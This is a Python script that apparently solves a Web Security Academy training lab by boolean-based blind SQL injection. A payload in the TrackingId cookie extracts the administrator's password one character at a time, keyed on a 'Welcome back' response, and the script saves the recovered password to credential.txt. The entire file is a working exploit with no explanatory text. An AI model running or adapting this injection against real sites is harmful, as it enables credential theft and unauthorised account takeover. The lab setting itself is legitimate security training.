import requests
import bruteforce as bf

URL = 'https://acce1fb01fb98a98c05e14c200c8003d.web-security-academy.net/login/'

status_code = requests.get(url=URL).status_code
if status_code != 200:
    print(f'Status code: {status_code}')
    exit(status_code)


bf_char = bf.ALLOWED_CHARACTERS[0]
pos = 1
password = ''
while bf_char != bf.ALLOWED_CHARACTERS[-1]:
    cookie = {
        'TrackingId': f"' or (select substring(password,{pos},1) from users where username = 'administrator') = '{bf_char}' --"
    }
    res_text = requests.get(url=URL, cookies=cookie).text

    print(f'{bf_char} - ', end='')

    with open('res.html', 'w') as file:
        file.write(res_text)
    if 'Welcome back' in res_text:
        print(f'password: {bf_char}')
        password += bf_char
        pos += 1
        bf_char = bf.ALLOWED_CHARACTERS[0]
    else:
        bf_char = bf.func_next_char(bf_char)

print(password)
with open('credential.txt', 'w') as file:
    file.write(password)
